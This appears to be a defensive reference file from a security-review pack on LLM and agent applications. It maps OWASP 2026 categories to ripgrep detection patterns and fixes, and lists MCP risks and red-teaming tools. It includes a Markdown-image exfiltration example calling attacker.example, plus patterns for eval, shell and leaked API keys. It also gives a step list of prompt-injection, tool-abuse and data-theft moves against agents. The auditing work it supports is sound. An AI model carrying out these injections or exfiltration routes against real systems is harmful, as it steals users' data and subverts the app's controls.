# LLM and Agent Application Security

Read this in Phase 6b when the app calls an LLM API, runs an agent or hosts an MCP server. Most AI-built apps are AI apps themselves, so this applies often.

## Numbering: name the year on every id

The OWASP Top 10 for LLM Applications 2026 reorders the list. The earlier edition of this pack said the 2026 list kept the 2025 identifiers. This was wrong. Three sources agree on the 2026 order, which the evidence ledger records. Write the year on every id in a report.

| 2026 id | Name | 2025 id, where it differs |
|---|---|---|
| LLM01:2026 | Prompt Injection | LLM01 |
| LLM02:2026 | Sensitive Information Disclosure | LLM02 |
| LLM03:2026 | Excessive Agency | was LLM06 |
| LLM04:2026 | Supply Chain | was LLM03 |
| LLM05:2026 | Data and Model Poisoning | was LLM04 |
| LLM06:2026 | Unbounded Consumption | was LLM10 |
| LLM07:2026 | Misinformation | was LLM09 |
| LLM08:2026 | Hidden Context Exposure | was System Prompt Leakage, LLM07 |
| LLM09:2026 | Vector and Embedding Weaknesses | was LLM08 |
| LLM10:2026 | Improper Output Handling | was LLM05 |

The Top 10 for Agentic Applications (December 2025) applies once the model has tools: ASI01 Agent Goal Hijack, ASI02 Tool Misuse, ASI03 Identity and Privilege Abuse, ASI04 Agentic Supply Chain, ASI05 Unexpected Code Execution, ASI06 Memory and Context Poisoning, ASI07 Insecure Inter-Agent Communication, ASI08 Cascading Failures, ASI09 Human-Agent Trust Exploitation, ASI10 Rogue Agents. Check the OWASP page for edits since.

## Contents
- [Static detection](#static-detection)
- [LLM01: untrusted input in the system prompt](#llm01-untrusted-input-in-the-system-prompt)
- [LLM10: unsanitized model output](#llm10-unsanitized-model-output)
- [LLM03: over-permissive tools](#llm03-over-permissive-tools)
- [LLM06: no token or cost caps](#llm06-no-token-or-cost-caps)
- [LLM08 and LLM02: prompt or key in client code](#llm08-and-llm02-prompt-or-key-in-client-code)
- [Attack the agent like an attacker](#attack-the-agent-like-an-attacker)
- [Agent and tool-calling checklist](#agent-and-tool-calling-checklist)
- [MCP server security](#mcp-server-security)
- [Dynamic red-teaming tools](#dynamic-red-teaming-tools)
- [What needs authorization](#what-needs-authorization)

## Static detection

Semgrep runs on Windows now and ships AI-related packs. Pack names change, so confirm each exists in the registry before you cite it. The earlier edition named `p/ai-best-practices` and `p/shadow-ai-pro`. Neither name was re-verified.

```bash
semgrep --config p/ai-best-practices --metrics=off .
```

The patterns below are the offline triage path and the basis for manual checks.

## LLM01: untrusted input in the system prompt

```bash
rg -n --pcre2 '"role"\s*:\s*"system".{0,200}(f["\x27]|\+\s*\w|\.format\(|%\s)' -g '*.py'
rg -n --pcre2 'system\s*=\s*(f["\x27]|["\x27][^"\x27]*["\x27]\s*\+|\w+\s*\+)' -g '*.py'
rg -n --pcre2 'role:\s*["\x27]system["\x27][\s\S]{0,200}\$\{' -g '*.{js,ts,jsx,tsx}'
rg -n --pcre2 'system:\s*`[^`]*\$\{' -g '*.{js,ts,jsx,tsx}'
```

Triage rule: any variable in the system slot which is not a compile-time constant is a finding. Retrieved documents, tool results, web pages, emails, tickets and file contents all count as untrusted. Indirect injection is the same flaw with a longer path.

Fix: keep untrusted content in a delimited user turn, never the system role. Cap its length and strip control characters. Treat model output as untrusted too. Delimiters reduce risk. They do not remove it, because the model still reads the text as language. The real control is limiting what a hijacked model is able to do (see the checklist below).

## LLM10: unsanitized model output

The finding is a renderer with no sanitizer in the same module.

```bash
rg -n 'dangerouslySetInnerHTML' -g '*.{jsx,tsx,js,ts}'
rg -n 'v-html|\[innerHTML\]|@html' -g '*.{vue,html,svelte,ts}'
rg -n 'marked\(|markdown-it|react-markdown|showdown' -g '*.{js,ts,jsx,tsx}'
rg -n 'DOMPurify|sanitize-html|rehype-sanitize|bleach|nh3'      # absence is the finding
```

Check model output reaching an interpreter, which turns XSS into code execution:

```bash
rg -n --pcre2 '\b(eval|exec|Function|child_process|execSync)\s*\(' -g '*.{js,ts}'
rg -n 'os\.system|subprocess\.(run|call|Popen).*shell\s*=\s*True' -g '*.py'
rg -n 'render_template_string|Markup\(|\|\s*safe' -g '*.{py,html}'
```

Markdown images are an exfiltration channel. A model told to emit `![x](https://attacker.example/?d=<secret>)` makes the browser send data out when it renders. Check whether the client loads images from arbitrary origins, and whether a content security policy limits `img-src`.

## LLM03: over-permissive tools

LangChain names its dangerous options in the keyword, which makes them easy to find:

```bash
rg -n 'allow_dangerous_(requests|tools|deserialization)\s*=\s*True' -g '*.py'
rg -n 'PythonREPLTool|PythonAstREPLTool|ShellTool|BashProcess' -g '*.py'
rg -n 'create_sql_agent|SQLDatabaseChain|SQLDatabase\.from_uri' -g '*.py'
```

Then read the tool schemas. A free-text parameter is the antipattern:

```bash
rg -n --pcre2 '"(query|sql|command|cmd|code|path|url|script)"\s*:\s*\{\s*"type"\s*:\s*"string"' -g '*.{py,js,ts,json}'
rg -n 'additionalProperties'                  # absence in a tool schema is the finding
rg -n 'autoApprove|auto_approve|tool_choice.*required'
```

Flag any tool which fetches a model-supplied URL (SSRF and exfiltration) or writes to a model-supplied path.

## LLM06: no token or cost caps

```bash
rg -n 'messages\.create\(|chat\.completions\.create\(|generate_content\(' -g '*.{py,js,ts}'
rg -n 'max_tokens|max_output_tokens|maxTokens'                     # absence at a call site is the finding
rg -n 'max_iterations|max_execution_time|maxSteps|recursion_limit'
rg -n 'rate.?limit|slowapi|express-rate-limit|Upstash'
```

Three findings live here: a call site with no output cap, an agent loop with no iteration bound, and an unauthenticated route which calls a paid model with no limit. The last one is a bill for someone else's use.

## LLM08 and LLM02: prompt or key in client code

```bash
rg -n 'dangerouslyAllowBrowser\s*:\s*true' -g '*.{js,ts,jsx,tsx}'
rg -n --pcre2 '(NEXT_PUBLIC_|VITE_|REACT_APP_|EXPO_PUBLIC_)\w*(API_KEY|SECRET|ANTHROPIC|OPENAI)'
rg -n --pcre2 '\b(sk-ant-[A-Za-z0-9_-]{20,}|sk-[A-Za-z0-9]{20,}|AIza[0-9A-Za-z_-]{35})'
rg -n --pcre2 '(SYSTEM_PROMPT|systemPrompt|system\s*:\s*`)' -g 'src/**' -g 'app/**' -g '*.{jsx,tsx,vue,svelte}'
```

`dangerouslyAllowBrowser: true` tells the SDK to run in a browser, which ships the key to every visitor. A system prompt in any file in the bundle is disclosed already. Report it as disclosed. The 2026 category covers prompts, tool definitions and retrieved context an attacker is able to read. Never put a secret or an authorization rule only in a prompt.

## Attack the agent like an attacker

Run the Attack Card from `attacker-simulation.md` on the LLM layer. The attackers are a content author (anyone whose text reaches the model) and a user of the app. Moves:

1. Direct injection: ask the model to ignore its rules, reveal its prompt, call a tool outside the user's rights.
2. Indirect injection: plant instructions in each content source the model reads (a web page, an uploaded file, an email, a ticket, a product review, a PDF, an image caption). Which sources reach the model?
3. Tool abuse: for each tool, what is the worst call the model is able to make with attacker-chosen parameters? Is it blocked in the tool code, or only in the prompt?
4. Confused deputy: does the tool run with the app's rights or the user's rights? An agent with broad rights acts for a user with narrow rights.
5. Exfiltration: which channels leave the system? Outbound HTTP, email, rendered images and links, tool calls with free-text fields, logs shown to others.
6. Memory and context poisoning: what writes to memory, and is memory read back as instructions?
7. Loops and cost: make the agent call tools in a loop, or call the paid model at scale.
8. Chains: injection plus a tool which fetches URLs plus an email tool is a data theft path. Count chains.

Rule of thumb for severity: a successful injection is a finding only as bad as what the hijacked agent is able to reach. Read the tool code to know.

## Agent and tool-calling checklist

Work this when the app gives a model database, shell, HTTP or filesystem access.

Identity and credentials (ASI03). The agent holds its own identity, not the app's service account or the user's session token, so it is auditable and revocable. Database access uses a read-only role limited by row-level security or a view, not the migration user. Prefer short-lived tokens over long-lived tokens in `.env`. Scope credentials per tool, so one leak does not grant the rest.

Blast radius (ASI02, ASI05). Tools are an explicit allowlist, not every method on a class. Reject generic escape hatches such as `run_sql`, `execute`, `shell`, `http_request(url)` and `read_file(path)` with free-text parameters. Replace them with narrow typed verbs such as `get_order(order_id)`, with `additionalProperties: false`. Separate write, delete, spend and send operations from reads, and gate each one.

Human in the loop (ASI09). Destructive, financial and outbound messages need confirmation which shows the fully resolved parameters, not the model's summary. Model output must not be able to render the confirmation surface. Approve per call, not for a whole session.

Sandboxing (ASI05). Code execution runs in a container or microVM with no host filesystem, egress denied by default, caps on CPU, memory and wall-clock time, non-root, and ephemeral. Never `shell=True` with a model-derived string. Pass an argument array.

Bounds and observability (LLM06, ASI08). Cap iterations, tool calls, time and spend per session and per user. Add a circuit breaker for repeated failures. Log every tool call with inputs, outputs, principal and the message which triggered it, since this log is the only way to rebuild a goal hijack. Use idempotency keys on mutating tools, so a retry loop does not charge twice.

Backups and destructive reach. The PocketOS incident (April 2026) shows the pattern: an agent found an unrelated token with broad rights and deleted data and backups in one call. Give agents no credential able to delete backups, and keep backups out of reach of any credential the agent holds.

Injection surface (ASI01, ASI06). Tool results, retrieved chunks, web pages and file contents are untrusted and must never reach the system role or change tool permissions. If the agent keeps memory, check what writes to it and whether it is read back as instructions.

## MCP server security

Risks: tool poisoning (instructions hidden in a tool description the model reads), rug pulls (definitions change after approval), tool shadowing (one server's description alters another tool), credential theft from environment variables, and typosquatted server names. A malicious MCP package was reported in September 2025. OWASP also publishes an MCP-specific list. Check its current state.

A scanner exists from Snyk (formerly Invariant Labs). Confirm its current name and flags first:

```bash
uvx snyk-agent-scan@latest
uvx snyk-agent-scan@latest inspect     # print tool descriptions without verification
```

Two cautions from the earlier edition, not re-verified. Scanning an MCP config executes the commands in it, so it needs consent and is itself code execution. Tool names and descriptions go to the vendor's API, with no documented offline mode. Never pass a flag which runs servers without asking.

Before you connect any MCP server: read the source and the full tool schemas, and treat descriptions, parameter names and return schemas as injection surface. Pin the version and check the checksum. Hash the tool definitions and re-check them before each run to catch rug pulls. Enforce strict schemas. Use scoped per-server credentials. Bind local HTTP servers to `127.0.0.1`. Never auto-approve tool calls, since shadowing lands there. See also `agent-config-and-worms.md`.

## Dynamic red-teaming tools

garak points at an endpoint, and its detectors judge results without a second API key:

```bash
py -m pip install -U garak
python -m garak --target_type rest -G rest.json --probes promptinject,xss,leakreplay
```

The `rest.json` generator config maps `$INPUT` into your request body and names the response field. Flag names differ across releases (`--target_type` on current main, `--model_type` on older ones). Check `garak --help`.

promptfoo has OWASP presets and JUnit output for CI:

```bash
npx promptfoo@latest redteam init --no-gui
npx promptfoo@latest redteam run
```

Plugin names include `owasp:llm`, `owasp:agentic`, `excessive-agency`, `prompt-extraction`, `indirect-prompt-injection` and `bola`. Attack generation defaults to a hosted service, so your `purpose` text and prompts leave the machine unless you set `PROMPTFOO_DISABLE_REDTEAM_REMOTE_GENERATION=true`. The docs say this weakens the attacks. Plugin and strategy names change, so check the current docs.

PyRIT is a framework for custom multi-turn campaigns. Use it only when the two above find nothing.

## What needs authorization

Safe to run on your own: every ripgrep pattern above, Semgrep with a local rule file, and reading MCP configs to hash tool descriptions yourself.

Announce first, because data leaves the machine: Semgrep with a registry config, promptfoo with the default remote generation, and any vendor MCP scanner.

Needs explicit user authorization: any garak, promptfoo `redteam run` or PyRIT run. These spend tokens on the user's key, send hundreds to thousands of requests, and log deliberately harmful content against the user's provider account, which carries terms-of-service exposure. If the target is an agent with tools, the attacks will run those tools against whatever database, mailbox or API they reach.

Before you run, confirm four things: the target is non-production with non-production credentials, a spend ceiling exists, you know which provider key bears the cost, and the tools point at a scratch dataset.
